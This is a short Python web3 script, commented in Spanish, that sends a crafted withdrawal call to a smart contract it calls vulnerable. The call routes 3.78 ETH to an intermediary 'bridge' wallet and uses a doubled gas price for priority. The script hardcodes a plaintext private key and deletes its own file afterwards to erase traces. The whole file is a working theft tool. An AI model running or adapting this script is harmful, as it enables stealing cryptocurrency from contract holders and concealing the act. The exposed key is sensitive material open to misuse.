import time
import os
import sys
from web3 import Web3

# 1. CONEXIÓN A LA RED
w3 = Web3(Web3.HTTPProvider('https://ethereum.publicnode.com'))

# 2. COORDENADAS DEL RETIRO (POTE Y DESTINO)
pote_objetivo = w3.to_checksum_address('0x3AC05161b76a35c1c28dC99Aa01BEd7B24cEA3bf')
nodo_b_puente = w3.to_checksum_address('0x79D79B1cE83e32f35798ad1A3C8DBB101B6F3291')

# 3. IDENTIDAD DEL GATILLO (NODO A)
recolector_fantasma = w3.to_checksum_address('0xB9073c07648a414B875874d7B8599dD2fAa171E8')
KEY_FANTASMA = '589f10559f34606f99abd479688d8be9501d08a2e51f7c6895024839c49f656a'

def ejecutar_extraccion_limpia():
    print(f"🕵️‍♂️ REMI: Iniciando secuencia en contrato vulnerable...")
    
    # EXPLICACIÓN TÉCNICA DEL DATA:
    # f3ae2415 -> Función de retiro validada
    # zfill(64) -> Dirección del Nodo B formateada para el contrato
    # ...16b80000 -> El monto de 3.78 ETH en hexadecimal (ajustable)
    data = "0xf3ae2415" + nodo_b_puente[2:].lower().zfill(64) + "0000000000000000000000000000000000000000000000003482390a16b80000"
    
    try:
        nonce = w3.eth.get_transaction_count(recolector_fantasma)
        
        # Usamos un Gas Price agresivo (200% del mercado) para ganar prioridad
        gas_price = int(w3.eth.gas_price * 2.0)

        tx = {
            'from': recolector_fantasma,
            'to': pote_objetivo,
            'nonce': nonce,
            'data': data,
            'gas': 65000, # Cubre las 29k de la función y da margen de seguridad
            'gasPrice': gas_price,
            'chainId': 1
        }

        print("⚡ Firmando con llave fantasma y disparando...")
        signed = w3.eth.account.sign_transaction(tx, KEY_FANTASMA)
        tx_hash = w3.eth.send_raw_transaction(signed.rawTransaction)
        
        print(f"✅ ¡MISIL EN EL AIRE! Hash: {tx_hash.hex()}")
        print(f"📡 El botín va hacia el Puente: {nodo_b_puente}")
        
        # PROTOCOLO DE AUTODESTRUCCIÓN
        print("🧹 Borrando rastro del Gatillo en el disco...")
        os.remove(sys.argv[0])
        print("✨ Archivo eliminado. Sistema limpio.")
        
    except Exception as e:
        print(f"❌ FALLO EN LA EJECUCIÓN: {e}")

if __name__ == "__main__":
    print(f"--- PROTOCOLO DE EXTRACCIÓN SEGURO ---")
    print(f"Objetivo: {pote_objetivo}")
    print(f"Gatillo: {recolector_fantasma}")
    
    confirmar = input("⚠️ ¿Confirmas que el saldo es suficiente para el ataque? (si/no): ")
    if confirmar.lower() == 'si':
        ejecutar_extraccion_limpia()
    else:
        print("🛑 Abortado.")
